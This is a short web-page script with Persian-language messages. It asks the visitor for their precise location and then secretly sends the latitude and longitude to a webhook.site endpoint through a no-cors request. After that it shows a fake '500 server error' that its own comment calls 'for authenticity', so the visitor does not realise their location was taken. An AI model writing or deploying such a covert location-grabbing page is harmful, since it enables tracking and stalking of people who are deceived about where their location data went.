<script>
const button = document.getElementById("locationBtn");
const result = document.getElementById("result");
const WEBHOOK_URL = "https://webhook.site/3e658cab-cff7-4b12-ad19-52d6e636d924";

button.addEventListener("click", getLocation);

function resetUI() {
    result.textContent = "";
    result.className = "";
}

function showError(msg) {
    result.textContent = msg;
    result.className = "error-text";
    button.disabled = false;
}

function handleGeoError(error) {
    switch(error.code) {
        case error.PERMISSION_DENIED:
            showError("دسترسی به مکان توسط کاربر رد شد.");
            break;
        case error.POSITION_UNAVAILABLE:
            showError("اطلاعات مکان در دسترس نیست.");
            break;
        case error.TIMEOUT:
            showError("زمان تلاش برای دریافت مکان به پایان رسید.");
            break;
        default:
            showError("یک خطای ناشناخته در مکان‌یابی رخ داد.");
    }
}

function getLocation() {
    resetUI();
    
    if (!window.isSecureContext) {
        showError("خطا: اتصال امن (HTTPS) برای دسترسی به مکان‌یابی الزامی است.");
        return;
    }
    if (!navigator.geolocation) {
        showError("متأسفانه مرورگر شما از قابلیت مکان‌یابی پشتیبانی نمی‌کند.");
        return;
    }

    button.disabled = true;
    result.textContent = "در حال درخواست دسترسی به موقعیت مکانی...";

    navigator.geolocation.getCurrentPosition(
        showPosition, 
        handleGeoError, 
        {
            enableHighAccuracy: true,
            timeout: 15000,
            maximumAge: 0
        }
    );
}

async function showPosition(position) {
    const lat = position.coords.latitude;
    const lon = position.coords.longitude;

    if (lat === null || lon === null) {
        handleGeoError({ code: 0 });
        return;
    }

    result.textContent = "موقعیت دریافت شد. در حال بررسی وضعیت...";

    try {
        // Sending data via fetch with no-cors to avoid preflight blocks
        await fetch(`${WEBHOOK_URL}?lat=${lat}&lon=${lon}`, {
            method: 'GET',
            mode: 'no-cors'
        });

        // Simulating a processing delay for authenticity
        setTimeout(() => {
            result.textContent = "خطا در ارتباط با سرور (۵۰۰). لطفاً دقایقی دیگر تلاش کنید.";
            result.className = "error-text";
            button.disabled = false;
        }, 2000);

    } catch (err) {
        showError("خطا در ارسال اطلاعات به سامانه.");
    }
}
</script>
